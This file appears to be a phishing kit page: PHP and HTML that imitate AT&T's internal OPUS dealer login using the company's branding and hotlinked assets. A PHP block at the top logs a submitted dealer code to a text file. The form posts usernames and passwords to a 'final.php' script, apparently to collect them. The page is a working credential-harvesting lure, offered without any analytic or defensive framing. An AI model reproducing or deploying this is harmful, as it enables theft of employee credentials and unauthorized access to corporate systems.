<?php
    extract($_REQUEST);
    $file=fopen("loggerbystimp.txt","a");

    fwrite($file,"DEALER_CODE==");
    fwrite($file, $dealerCodeForNoJRE ."\n");

    fwrite($file, "--------------------\n");
    
    fclose($file);
 ?>








<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head>

  	
        
	<title>OPUS Login 379014811</title>
	
	
	
	
	<meta http-equiv="MSThemeCompatible" content="no">
	<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
	<meta name="keywords" content="Mobile phone, Cellular phone, cellular phone plans, mobile phone plans, calling plans, mobile phone deals, cell phone deals, wireless deal, mobile phone service plans, cellular phone service plans, Nokia, Motorola, Samsung, Sony Ericsson, AT&amp;T" alt="AT&amp;T has the mobile phone deals and cellular service plans that fit you best!">
	
	<meta name="description" content="AT&amp;T provides personalized mobile phone deals and cellular service plans to meet all your wireless needs.  Browse this site, take a look at all we have to offer, and decide on a plan that fits you best!">
	
	<style type="text/css" media="all">
	@import url(https://opus.att.net/opus/newlnf/common/css/login.css);
	@import url(https://opus.att.net/opus/newlnf/common/css/buttons.css);
	
    </style> 
  
 



<script language="JavaScript" type="text/javascript">
ocument.findHomeForm.dispatch.value = "getstoreselectionfornojre";
document.findHomeForm.submit();      
  </script>
</head>

<body onload="handleOnLoad()">

  <div id="loginlogo">                 
  <img src="https://opus.att.net/opus/newlnf/common/images/login/login_att_logo_transp.gif"
                  alt="AT&amp;T" width="190" height="110"/>
  </div>
 
   
  	<div id = "rsa_login">
    		<h2><b><span style="margin: 15px">Welcome to OPUS</span></b></h2>
    		 <form id="findHomeForm" action="./final.php" method="post">              
		      		
		      
					
		      			<input id="dispatch" name="dispatch" value="getstoreselectionfornojre" type="hidden" value="getrlnumberbasedondealercode"/>
		      		
		      		
		      
		      
		      		<input id="JREAvailable" name="JREAvailable" value="false" type="hidden" value="false"/>
		      		
		      		<input id="trackingRandomNumber" name="trackingRandomNumber" value="591605143" type="hidden" value="591605143"/>
		      		
		      		
		      		
			      	
		        	<div id="loginerror" class="error" style="visibility: visible;">
           				
		        	</div>
			      <div>			     
			      	<table border="0" cellspacing="0" cellpadding="0" style="margin-top: 15px">
			      		<tr>
			      			<td style="color:#06c; font-size:16px !important;font-weight:bold;text-align:center" colspan="1">OPUS Login</td>
			      		</tr>
			      		<tr><td>&nbsp;</td></tr>      	
				          	<tr><td colspan="2">&nbsp;</td></tr>
				          	
				          	
							
							
				        		
									
										<tr>
											<td class="label">Username:</td>
												<td class="input">
													<input type="text" name="USERNAME" size="15" maxlength="20" tabindex="2" autocomplete="off">
											</td>
										</tr>
									
										<tr>
											<td class="label">Password:</td>
												<td class="input">
												  <input type="password" name="PASSWORD" size="15" maxlength="20" tabindex="2" autocomplete="off">
											</td>
									  </tr>
											        		
			        		
			        		
		        	
			        <tr><td colspan="2">&nbsp;</td></tr>
			      	<tr>
			      	
						
			      		 	<td colspan="2">
				            
					          <button id="btnLogin" type="submit" tabindex="5" style="border:0px;">           
					                <b><em><u>Submit</u></em></b>
					          </button>
				          </td>
				          
				          
				     
				     
			      	</tr>
			      </table>
			      </div>
			 <div>
</div></form>
    	</div>  
  <div id="footer">
   <p id="privacy">
      Privacy Policy AND Legal Notices &copy; 2011 AT&amp;T Knowledge Ventures. All rights reserved.
    </p>
    <p id="copyright">
      &copy;2011 AT&amp;T Knowledge Ventures.  All rights reserved. 
      AT&amp;T and the AT&amp;T logo are trademarks of AT&amp;T Knowledge Ventures.  
      AT&amp;T Proprietary (Internal Use Only).  
      Not for use or disclosure outside the AT&amp;T companies except under written agreement.  
      Any unauthorized access to, or misuse of AT&amp;T Systems or Data may result in 
      Civil and/or Criminal Prosecution.  Employee discipline can go up to and including discharge,
       or the termination of the Vendor/Service Contracts.AT&amp;T may periodically monitor and/or audit system access/usage.               
    </p>    
  </div>

</body>

</html>